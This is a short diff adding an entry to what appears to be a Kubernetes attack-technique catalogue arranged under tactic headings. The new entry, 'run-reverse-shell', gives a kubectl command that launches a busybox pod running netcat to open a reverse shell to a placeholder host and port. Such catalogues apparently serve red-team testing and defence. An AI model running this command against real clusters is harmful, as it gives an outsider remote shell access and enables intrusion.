@@ -2,6 +2,10 @@
 
 # EXECUTION
 
+id: run-reverse-shell
+  description: Run a Reverse Shell from the Kubernetes Cluster to your Host
+  command: kubectl run pod-shell --image=busybox -- nc <HOST> <PORT> -e /bin/sh
+
 # PERSISTENCE
 
 # PRIVILEGE ESCALATION
